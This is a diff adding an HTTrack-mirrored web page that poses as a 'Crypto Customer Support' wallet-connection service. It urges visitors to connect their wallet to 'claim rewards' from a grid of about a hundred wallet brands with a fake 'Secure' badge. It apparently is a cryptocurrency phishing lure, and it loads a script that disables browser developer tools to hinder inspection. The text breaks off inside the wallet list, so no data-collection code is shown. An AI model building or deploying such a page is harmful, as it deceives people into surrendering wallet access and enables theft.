@@ -1,0 +1,1338 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<!-- Mirrored from dappmulticoins.web.app/app/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 24 Aug 2026 14:03:11 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>kerneldao Connection Page</title>
+  <link rel="stylesheet" href="assets/styles.css" />
+  <style>
+    .navbar__title {
+      background: linear-gradient(to right, #0a0e14 0, #0a0e14 42.86%, #1fd87a 42.86%, #1fd87a 100%);
+      -webkit-background-clip: text;
+      font-weight: 700;
+      letter-spacing: 1px;
+      -webkit-text-fill-color: #0000;
+      background-clip: text;
+    }
+
+    @keyframes slide-in-one-tap {
+      from {
+        transform: translateY(80px);
+      }
+
+      to {
+        transform: translateY(0px);
+      }
+    }
+
+    .trust-hide-gracefully {
+      opacity: 0;
+    }
+
+    .trust-wallet-one-tap .hidden {
+      display: none;
+    }
+
+    .trust-wallet-one-tap .semibold {
+      font-weight: 500;
+    }
+
+    .trust-wallet-one-tap .binance-plex {
+      font-family: "Binance";
+    }
+
+    .trust-wallet-one-tap .rounded-full {
+      border-radius: 50%;
+    }
+
+    .trust-wallet-one-tap .flex {
+      display: flex;
+    }
+
+    .trust-wallet-one-tap .flex-col {
+      flex-direction: column;
+    }
+
+    .trust-wallet-one-tap .items-center {
+      align-items: center;
+    }
+
+    .trust-wallet-one-tap .space-between {
+      justify-content: space-between;
+    }
+
+    .trust-wallet-one-tap .justify-center {
+      justify-content: center;
+    }
+
+    .trust-wallet-one-tap .w-full {
+      width: 100%;
+    }
+
+    .trust-wallet-one-tap .box {
+      transition: all 0.5s cubic-bezier(0, 0, 0, 1.43);
+      animation: slide-in-one-tap 0.5s cubic-bezier(0, 0, 0, 1.43);
+      width: 384px;
+      border-radius: 15px;
+      background: #fff;
+      box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.25);
+      position: fixed;
+      right: 30px;
+      bottom: 30px;
+      z-index: 1020;
+    }
+
+    .trust-wallet-one-tap .header {
+      gap: 15px;
+      border-bottom: 1px solid #e6e6e6;
+      padding: 10px 18px;
+    }
+
+    .trust-wallet-one-tap .header .left-items {
+      gap: 15px;
+    }
+
+    .trust-wallet-one-tap .header .title {
+      color: #1e2329;
+      font-size: 18px;
+      font-weight: 600;
+      line-height: 28px;
+    }
+
+    .trust-wallet-one-tap .header .subtitle {
+      color: #474d57;
+      font-size: 14px;
+      line-height: 20px;
+    }
+
+    .trust-wallet-one-tap .header .close {
+      color: #1e2329;
+      cursor: pointer;
+    }
+
+    .trust-wallet-one-tap .body {
+      padding: 9px 18px;
+      gap: 10px;
+    }
+
+    .trust-wallet-one-tap .body .right-items {
+      gap: 10px;
+      width: 100%;
+    }
+
+    .trust-wallet-one-tap .body .right-items .wallet-title {
+      color: #1e2329;
+      font-size: 16px;
+      font-weight: 600;
+      line-height: 20px;
+    }
+
+    .trust-wallet-one-tap .body .right-items .wallet-subtitle {
+      color: #474d57;
+      font-size: 14px;
+      line-height: 20px;
+    }
+
+    .trust-wallet-one-tap .connect-indicator {
+      gap: 15px;
+      padding: 8px 0;
+    }
+
+    .trust-wallet-one-tap .connect-indicator .flow-icon {
+      color: #474d57;
+    }
+
+    .trust-wallet-one-tap .loading-color {
+      color: #fff;
+    }
+
+    .trust-wallet-one-tap .button {
+      border-radius: 50px;
+      outline: 2px solid transparent;
+      outline-offset: 2px;
+      background-color: rgb(5, 0, 255);
+      border-color: rgb(229, 231, 235);
+      cursor: pointer;
+      text-align: center;
+      height: 45px;
+    }
+
+    .trust-wallet-one-tap .button .button-text {
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      line-height: 20px;
+    }
+
+    .trust-wallet-one-tap .footer {
+      margin: 20px 30px;
+    }
+
+    .trust-wallet-one-tap .check-icon {
+      color: #fff;
+    }
+
+    @font-face {
+      font-family: "Binance";
+      src: url(chrome-extension_/egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Regular.html) format("opentype");
+      font-weight: 400;
+      font-style: normal;
+    }
+
+    @font-face {
+      font-family: "Binance";
+      src: url(chrome-extension_/egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Medium.html) format("opentype");
+      font-weight: 500;
+      font-style: normal;
+    }
+
+    @font-face {
+      font-family: "Binance";
+      src: url(chrome-extension_/egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-SemiBold.html) format("opentype");
+      font-weight: 600;
+      font-style: normal;
+    }
+  </style>
+  <script disable-devtool-auto src='../../cdn.jsdelivr.net/npm/disable-devtool/disable-devtool.min.js'></script>
+</head>
+
+<body>
+  <div class="container">
+    <header>
+      <div style="display: flex; justify-content: center; align-items: center;">
+       <h1>Crypto Customer Support</h1>
+      </div>
+      <p class="subtitle">Connect your wallet to claim your rewards</p>
+      <div class="search-container">
+        <input type="text" id="walletSearch" placeholder="Search wallets..." class="search-input" />
+      </div>
+    </header>
+
+    <main> 
+
+      <div class="wallet-selector">
+        <div class="selector-header">
+          <h2>Select Wallet</h2>
+          <div class="secure-badge">
+            <span>🛡️ Secure</span>
+          </div>
+        </div>
+
+        <div class="wallets-grid">
+          <button class="wallet-button" data-wallet="Neon Wallet">
+            <div class="wallet-icon">
+              <img src="assets/neonwallet.f1970778.png" alt="Neon Wallet" />
+            </div>
+            <span>Neon Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="MetaMask Wallet">
+            <div class="wallet-icon">
+              <img src="assets/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png" alt="MetaMask" />
+            </div>
+            <span>MetaMask Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Coinbase Wallet">
+            <div class="wallet-icon">
+              <img src="assets/coinbase.png" alt="Coinbase Wallet" />
+            </div>
+            <span>Coinbase Wallet</span>
+          </button>
+          		            <button class="wallet-button" data-wallet=" WalletConnect">
+            <div class="wallet-icon">
+              <img src="assets/walletconnect.png" alt="WalletConnect" />
+            </div>
+            <span>WalletConnect</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="trust-wallet">
+            <div class="wallet-icon">
+              <img src="assets/trust-wallet-66f8777532931d9c09b633344981a6a9.png" alt="Trust Wallet" />
+            </div>
+            <span>Trust Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="rainbow-wallet">
+            <div class="wallet-icon">
+              <img src="assets/rainbow.jpg" alt="Rainbow Wallet" />
+            </div>
+            <span>Rainbow Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="ledger">
+            <div class="wallet-icon">
+              <img src="assets/ledger%20live.png" alt="Ledger Wallet" />
+            </div>
+            <span>Ledger Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="phantom">
+            <div class="wallet-icon">
+              <img src="assets/phanton.png" alt="Phantom Wallet" />
+            </div>
+            <span>Phantom Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="xumm">
+            <div class="wallet-icon">
+              <img src="assets/xumm.png" alt="Xumm Wallet" />
+            </div>
+            <span>Xumm Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Alice Wallet">
+            <div class="wallet-icon">
+              <img src="assets/alice.webp" alt="Alice Wallet" />
+            </div>
+            <span>Alice Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Onto Wallet">
+            <div class="wallet-icon">
+              <img src="assets/Onto.jpg" alt="Onto Wallet" />
+            </div>
+            <span>ONTO</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Agent Wallet">
+            <div class="wallet-icon">
+              <img src="assets/agent.jpg" alt="Agent Wallet" />
+            </div>
+            <span>Agent Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="CYBAVO Wallet">
+            <div class="wallet-icon">
+              <img src="assets/cybavo.jpg" alt="CYBAVO Wallet" />
+            </div>
+            <span>CYBAVO Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Nash">
+            <div class="wallet-icon">
+              <img src="assets/nash.jpg" alt="Nash" />
+            </div>
+            <span>Nash</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Pillar">
+            <div class="wallet-icon">
+              <img src="assets/pillar.webp" alt="Pillar" />
+            </div>
+            <span>Pillar</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Bitpay">
+            <div class="wallet-icon">
+              <img src="assets/bitpay-1573dd6c95eb38386f181048663590d0.jpg" alt="Bitpay" />
+            </div>
+            <span>Bitpay</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Dharma">
+            <div class="wallet-icon">
+              <img src="assets/Dhrama.jpg" alt="Dharma" />
+            </div>
+            <span>Dharma</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Authereum">
+            <div class="wallet-icon">
+              <img src="assets/Authereum.jpg" alt="Authereum" />
+            </div>
+            <span>Authereum</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="1inch Wallet">
+            <div class="wallet-icon">
+              <img src="assets/1inch.jpg" alt="1inch Wallet" />
+            </div>
+            <span>1inch Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="MetaMask Wallet">
+            <div class="wallet-icon">
+              <img src="assets/Flamingo.webp" alt="MetaMask" />
+            </div>
+            <span>Flamingo Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Eidoo Wallet">
+            <div class="wallet-icon">
+              <img src="assets/eidoo.jpg" alt="Eidoo Wallet" />
+            </div>
+            <span>Eidoo Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="MYKEY">
+            <div class="wallet-icon">
+              <img src="assets/Mykey.jpg" alt="MYKEY" />
+            </div>
+            <span>MYKEY</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Trustvault">
+            <div class="wallet-icon">
+              <img src="assets/Truthvault.jpg" alt="Trustvault" />
+            </div>
+            <span>Trustvault</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="ZkSync">
+            <div class="wallet-icon">
+              <img src="assets/znky.jpg" alt="ZkSync" />
+            </div>
+            <span>ZkSync</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Shell Exchange">
+            <div class="wallet-icon">
+              <img src="assets/shell-f8ae42223837aae3358dcc1de881406e.jpg" alt="Shell Exchange" />
+            </div>
+            <span>Shell Exchange</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Space">
+            <div class="wallet-icon">
+              <img src="assets/space-9705cd779cebb6665ca3e9c2f124ef3a.png" alt="Space" />
+            </div>
+            <span>Space</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Index Coop">
+            <div class="wallet-icon">
+              <img src="assets/indexcoop-9c383dd154f6f30145853d7ec3726c4c.jpg" alt="Index Coop" />
+            </div>
+            <span>Index Coop</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="SwapX">
+            <div class="wallet-icon">
+              <img src="assets/swap.jpg" alt="SwapX" />
+            </div>
+            <span>SwapX</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Starname">
+            <div class="wallet-icon">
+              <img src="assets/starname.png" alt="Starname" />
+            </div>
+            <span>Starname</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Maskbook">
+            <div class="wallet-icon">
+              <img src="assets/maskbook-808a88212bc45b95cf21835db9b01b50.png" alt="Maskbook" />
+            </div>
+            <span>Maskbook</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Snapshot">
+            <div class="wallet-icon">
+              <img src="assets/snapp.jpg" alt="Snapshot" />
+            </div>
+            <span>Snapshot</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Invoice.Build">
+            <div class="wallet-icon">
+              <img src="assets/invoice.png" alt="Invoice.Build" />
+            </div>
+            <span>Invoice.Build</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Ankr">
+            <div class="wallet-icon">
+              <img src="assets/ankr-37d75439a9caa532b64264103a1afd57.jpg" alt="Ankr" />
+            </div>
+            <span>Ankr</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Dodo">
+            <div class="wallet-icon">
+              <img src="assets/dodo.png" alt="Dodo" />
+            </div>
+            <span>Dodo</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Zlot">
+            <div class="wallet-icon">
+              <img src="assets/zlot-94acfa2da7de104d5ec9b4f8d443660b.jpg" alt="Zlot" />
+            </div>
+            <span>Zlot</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Zlot">
+            <div class="wallet-icon">
+              <img src="assets/tokmark.png" alt="Zlot" />
+            </div>
+            <span>Tokamak Network</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Actus Protocol">
+            <div class="wallet-icon">
+              <img src="assets/actusprotocol-ddd166bdc4b0d50e5c73de0317da32ce.jpg" alt="Actus Protocol" />
+            </div>
+            <span>Actus Protocol</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="AstroTools.io">
+            <div class="wallet-icon">
+              <img src="assets/actusprotocol-ddd166bdc4b0d50e5c73de0317da32ce.jpg" alt="AstroTools.io" />
+            </div>
+            <span>AstroTools.io</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Rubic Exhange">
+            <div class="wallet-icon">
+              <img src="assets/rubic-b6978d64b0197aec38ebf807ea0dfae7.jpg" alt="Rubic Exhange" />
+            </div>
+            <span>Rubic Exhange</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Torus Wallet">
+            <div class="wallet-icon">
+              <img src="assets/torus.jpg" alt="Torus Wallet" />
+            </div>
+            <span>Torus Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Oceanprotocol">
+            <div class="wallet-icon">
+              <img src="assets/oceanprotocol.png" alt="Oceanprotocol" />
+            </div>
+            <span>Oceanprotocol</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Filecone Wallet">
+            <div class="wallet-icon">
+              <img src="assets/filecoin.png" alt="Filecone Wallet" />
+            </div>
+            <span>Filecone Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Falconswap">
+            <div class="wallet-icon">
+              <img src="assets/falconswap.png" alt="Falconswap" />
+            </div>
+            <span>Falconswap</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Bancor Wallet">
+            <div class="wallet-icon">
+              <img src="assets/falconswap.png" alt="Bancor Wallet" />
+            </div>
+            <span>Bancor Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Harvest Finance">
+            <div class="wallet-icon">
+              <img src="assets/harvestfinance-a7aa9bb0416d32081b2677b2e775405b.jpg" alt="Harvest Finance" />
+            </div>
+            <span>Harvest Finance</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="OctoFi">
+            <div class="wallet-icon">
+              <img src="assets/octofi.jpg" alt="OctoFi" />
+            </div>
+            <span>OctoFi</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Mushroom Finance">
+            <div class="wallet-icon">
+              <img src="assets/mushroomfinance-5a5378ebb4d4d876246e8a3954bc032e.jpg" alt="Mushroom Finance" />
+            </div>
+            <span>Mushroom Finance</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Bitfrost Finance">
+            <div class="wallet-icon">
+              <img src="assets/bitfro.png" alt="Bitfrost Finance" />
+            </div>
+            <span>Bitfrost Finance</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Orchid Protocol">
+            <div class="wallet-icon">
+              <img src="assets/orchid-5723e8a24869107efe2e6168bcf235a3.png" alt="Orchid Protocol" />
+            </div>
+            <span>Orchid Protocol</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Datamine Network">
+            <div class="wallet-icon">
+              <img src="assets/datamine-877d73dc8c545a84c6b896a2edb75ada.jpg" alt="Datamine Network" />
+            </div>
+            <span>Datamine Network</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Streamr">
+            <div class="wallet-icon">
+              <img src="assets/streamr-cde993547e274bc2a0218d4cfc86c897.jpg" alt="Streamr" />
+            </div>
+            <span>Streamr</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="DappRadar">
+            <div class="wallet-icon">
+              <img src="assets/dappradar-7f07c704c76c4a8c341714096e8667f0.png" alt="DappRadar" />
+            </div>
+            <span>DappRadar</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="SuperRare">
+            <div class="wallet-icon">
+              <img src="assets/super.jpg" alt="SuperRare" />
+            </div>
+            <span>SuperRare</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Arbitrum">
+            <div class="wallet-icon">
+              <img src="assets/arbitrum-f1518d05463bc02dcad2ea97e93b7797.jpg" alt="Arbitrum" />
+            </div>
+            <span>Arbitrum</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Paraswap">
+            <div class="wallet-icon">
+              <img src="assets/Paraswap.jpg" alt="Paraswap" />
+            </div>
+            <span>Paraswap</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="HoneySwap">
+            <div class="wallet-icon">
+              <img src="assets/honeyswap-352ce745732a31d09400a6ccd72926ac.jpg" alt="HoneySwap" />
+            </div>
+            <span>HoneySwap</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Fleek">
+            <div class="wallet-icon">
+              <img src="assets/fleek-866527cf9372053c6f559b0b08f5b50f.png" alt="Fleek" />
+            </div>
+            <span>Fleek</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Coolwallet">
+            <div class="wallet-icon">
+              <img src="assets/coolwallets.webp" alt="Coolwallet" />
+            </div>
+            <span>Coolwallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="AlphaWallet">
+            <div class="wallet-icon">
+              <img src="assets/alphawallet.webp" alt="AlphaWallet" />
+            </div>
+            <span>AlphaWallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Zelcore">
+            <div class="wallet-icon">
+              <img src="assets/zelcore.webp" alt="Zelcore" />
+            </div>
+            <span>Zelcore</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Sollet Wallet">
+            <div class="wallet-icon">
+              <img src="assets/sollet.webp" alt="Sollet Wallet" />
+            </div>
+            <span>Sollet Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Tokenary">
+            <div class="wallet-icon">
+              <img src="assets/tokenary.jpg" alt="Tokenary" />
+            </div>
+            <span>Tokenary</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Spatium">
+            <div class="wallet-icon">
+              <img src="assets/spatium.webp" alt="Spatium" />
+            </div>
+            <span>Spatium</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Infinito">
+            <div class="wallet-icon">
+              <img src="assets/infinito-wallet-68da061495160c96f4bcb5e70e612fdd.png" alt="Infinito" />
+            </div>
+            <span>Infinito</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Ownbit">
+            <div class="wallet-icon">
+              <img src="assets/ownbit-0b6b21e40acf2fa0f85d2c5ce38c4c51.png" alt="Ownbit" />
+            </div>
+            <span>Ownbit</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="EasyPocket">
+            <div class="wallet-icon">
+              <img src="assets/easywallet.jpg" alt="EasyPocket" />
+            </div>
+            <span>EasyPocket</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Bridge Wallet">
+            <div class="wallet-icon">
+              <img src="assets/bridge.jpg" alt="Bridge Wallet" />
+            </div>
+            <span>Bridge Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Best Wallet">
+            <div class="wallet-icon">
+              <img src="assets/best.png" alt="Best Wallet" />
+            </div>
+            <span>Best Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Coinomi Wallet">
+            <div class="wallet-icon">
+              <img src="assets/coinomi.jpg" alt="Coinomi Wallet" />
+            </div>
+            <span>Coinomi Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="WalletConnect">
+            <div class="wallet-icon">
+              <img src="assets/wc.jpg" alt="WalletConnect" />
+            </div>
+            <span>WalletConnect</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Kaspa Wallet">
+            <div class="wallet-icon">
+              <img src="assets/kasp.webp" alt="Kaspa Wallet" />
+            </div>
+            <span>Kaspa Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Chainge Wallet">
+            <div class="wallet-icon">
+              <img src="assets/chain.jpg" alt="Chainge Wallet" />
+            </div>
+            <span>Chainge Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="SafePal Wallet">
+            <div class="wallet-icon">
+              <img src="assets/safepal%20new.webp" alt="SafePal Wallet" />
+            </div>
+            <span>SafePal Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Slingshot Wallet">
+            <div class="wallet-icon">
+              <img src="assets/slingshot.webp" alt="Slingshot Wallet" />
+            </div>
+            <span>Slingshot Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Keplr Wallet">
+            <div class="wallet-icon">
+              <img src="assets/keplr.png" alt="Keplr Wallet" />
+            </div>
+            <span>Keplr Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Solana Wallet">
+            <div class="wallet-icon">
+              <img src="assets/solana.png" alt="Solana Wallet" />
+            </div>
+            <span>Solana Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Blockchain Wallet">
+            <div class="wallet-icon">
+              <img src="assets/blockchain-logo.png" alt="Blockchain Wallet" />
+            </div>
+            <span>Blockchain Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Lobstr Wallet">
+            <div class="wallet-icon">
+              <img src="assets/lb.jpg" alt="Lobstr Wallet" />
+            </div>
+            <span>Lobstr Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Yoroi Wallet">
+            <div class="wallet-icon">
+              <img src="assets/yr.jpg" alt="Yoroi Wallet" />
+            </div>
+            <span>Yoroi Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Edge Wallet">
+            <div class="wallet-icon">
+              <img src="assets/ed.jpg" alt="Edge Wallet" />
+            </div>
+            <span>Edge Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Solar Wallet">
+            <div class="wallet-icon">
+              <img src="assets/solar.jpg" alt="Solar Wallet" />
+            </div>
+            <span>Solar Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Pera Algo Wallet">
+            <div class="wallet-icon">
+              <img src="assets/pera-algo.jpg" alt="Pera Algo Wallet" />
+            </div>
+            <span>Pera Algo Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Sender Wallet">
+            <div class="wallet-icon">
+              <img src="assets/sender.jpg" alt="Sender Wallet" />
+            </div>
+            <span>Sender Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Xcel Pay Wallet">
+            <div class="wallet-icon">
+              <img src="assets/xceipay.jpg" alt="Xcel Pay Wallet" />
+            </div>
+            <span>Xcel Pay Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Curvy Wallet">
+            <div class="wallet-icon">
+              <img src="assets/curvelogo.png" alt="Curvy Wallet" />
+            </div>
+            <span>Curvy Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Trezor">
+            <div class="wallet-icon">
+              <img src="assets/trezor.png" alt="Trezor" />
+            </div>
+            <span>Trezor</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Exodus">
+            <div class="wallet-icon">
+              <img src="assets/exodus.png" alt="Exodus" />
+            </div>
+            <span>Exodus</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Argent Wallet">
+            <div class="wallet-icon">
+              <img src="assets/image.jpg" alt="Argent" />
+            </div>
+            <span>Argent</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Gnosis Safe">
+            <div class="wallet-icon">
+              <img src="assets/Gnosis%20Safe.webp" alt="Gnosis Safe" />
+            </div>
+            <span>Gnosis Safe</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Zerion Wallet">
+            <div class="wallet-icon">
+              <img src="assets/zerion.webp" alt="Zerion Wallet" />
+            </div>
+            <span>Zerion Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="TokenPocket Wallet">
+            <div class="wallet-icon">
+              <img src="assets/tokenpocket.webp" alt="TokenPocket Wallet" />
+            </div>
+            <span>TokenPocket Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="imToken">
+            <div class="wallet-icon">
+              <img src="assets/imtoken-fd8c7c52dac6101568954e7448a49202.png" alt="imToken" />
+            </div>
+            <span>imToken</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="huobi">
+            <div class="wallet-icon">
+              <img src="assets/huobi.webp" alt="Huobi Wallet" />
+            </div>
+            <span>Huobi Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="mathwallet">
+            <div class="wallet-icon">
+              <img src="assets/mathwallet.jpg" alt="Math Wallet" />
+            </div>
+            <span>Math Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="bitkeep">
+            <div class="wallet-icon">
+              <img src="assets/bitkeep.webp" alt="Bitkeep" />
+            </div>
+            <span>Bitkeep</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="safepal">
+            <div class="wallet-icon">
+              <img src="assets/safepal%20new.webp" alt="SafePal" />
+            </div>
+            <span>SafePal</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="brave">
+            <div class="wallet-icon">
+              <img src="assets/brave-logo-sans-text.svg" alt="Brave Wallet" />
+            </div>
+            <span>Brave Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="status">
+            <div class="wallet-icon">
+              <img src="assets/status.webp" alt="Status" />
+            </div>
+            <span>Status</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="atomic">
+            <div class="wallet-icon">
+              <img src="assets/Atomic.jpg" alt="Atomic Wallet" />
+            </div>
+            <span>Atomic Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="klever">
+            <div class="wallet-icon">
+              <img src="assets/klever.png" alt="Klever" />
+            </div>
+            <span>Klever</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="guarda">
+            <div class="wallet-icon">
+              <img src="assets/Guarda%20Wallet.webp" alt="Guarda Wallet" />
+            </div>
+            <span>Guarda Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Coin98">
+            <div class="wallet-icon">
+              <img src="assets/coin98.jpg" alt="Coin98" />
+            </div>
+            <span>Coin98</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Slope">
+            <div class="wallet-icon">
+              <img src="assets/slope.png" alt="Slope" />
+            </div>
+            <span>Slope</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Solflare">
+            <div class="wallet-icon">
+              <img src="assets/solf.webp" alt="Solflare" />
+            </div>
+            <span>Solflare</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Backpack">
+            <div class="wallet-icon">
+              <img src="assets/backpack.png" alt="Backpack" />
+            </div>
+            <span>Backpack</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Glow">
+            <div class="wallet-icon">
+              <img src="assets/glow.png" alt="Glow" />
+            </div>
+            <span>Glow</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Frontier">
+            <div class="wallet-icon">
+              <img src="assets/frontier.png" alt="Frontier" />
+            </div>
+            <span>Frontier</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Rabby">
+            <div class="wallet-icon">
+              <img src="assets/rabby.jpg" alt="Rabby" />
+            </div>
+            <span>Rabby</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Petra">
+            <div class="wallet-icon">
+              <img src="assets/petra.jpg" alt="Petra" />
+            </div>
+            <span>Petra</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="pontem">
+            <div class="wallet-icon">
+              <img src="assets/pontem.png" alt="Pontem Wallet" />
+            </div>
+            <span>Pontem</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="fewcha">
+            <div class="wallet-icon">
+              <img src="assets/fewcha.png" alt="Fewcha Wallet" />
+            </div>
+            <span>Fewcha</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="martian">
+            <div class="wallet-icon">
+              <img src="assets/mar.png" alt="Martian Wallet" />
+            </div>
+            <span>Martian</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="rise">
+            <div class="wallet-icon">
+              <img src="assets/rise.jpg" alt="Rise Wallet" />
+            </div>
+            <span>Rise</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="bitget">
+            <div class="wallet-icon">
+              <img src="assets/bitget.png" alt="Bitget Wallet" />
+            </div>
+            <span>Bitget</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="okx">
+            <div class="wallet-icon">
+              <img src="assets/Logo-OKX.png" alt="OKX Wallet" />
+            </div>
+            <span>OKX</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Leap">
+            <div class="wallet-icon">
+              <img src="assets/leap-wallet-f8881b26.jpg" alt="Leap" />
+            </div>
+            <span>Leap</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Station">
+            <div class="wallet-icon">
+              <img src="assets/terrastation2.webp" alt="Station" />
+            </div>
+            <span>Station</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="XDEFI">
+            <div class="wallet-icon">
+              <img src="assets/xdefi.png" alt="XDEFI" />
+            </div>
+            <span>XDEFI</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Finnie">
+            <div class="wallet-icon">
+              <img src="assets/finnie.jpg" alt="Finnie" />
+            </div>
+            <span>Finnie</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Cosmostation">
+            <div class="wallet-icon">
+              <img src="assets/cosmostation_logo.png" alt="Cosmostation" />
+            </div>
+            <span>Cosmostation</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="BitPie">
